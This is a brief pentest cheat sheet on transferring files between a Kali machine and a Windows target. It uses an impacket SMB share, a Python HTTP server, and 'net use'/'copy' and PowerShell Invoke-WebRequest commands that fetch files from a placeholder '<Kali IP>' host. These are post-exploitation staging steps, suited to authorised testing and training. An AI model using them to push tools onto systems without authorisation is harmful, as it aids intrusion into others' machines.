# File transfer

## SMB - from Windows to Kali or vice-versa

On Kali start a SMB share server on the folder you want to be shared
```
cd <path>
impacket-smbserver share $(pwd) -smb2support
```

On the target
```
net use \\<Kali IP>\share
net use
copy \\<Kali IP>\share\<file> .
dir
```

## HTTP - from Kali to target

```
cd <path>
sudo python -m SimpleHTTPServer 80
```

### download from Windows

Powershell
```
Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
```





## Links
- [file transfer cheatsheet Windows and Linux](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
- https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/
- https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/
- https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html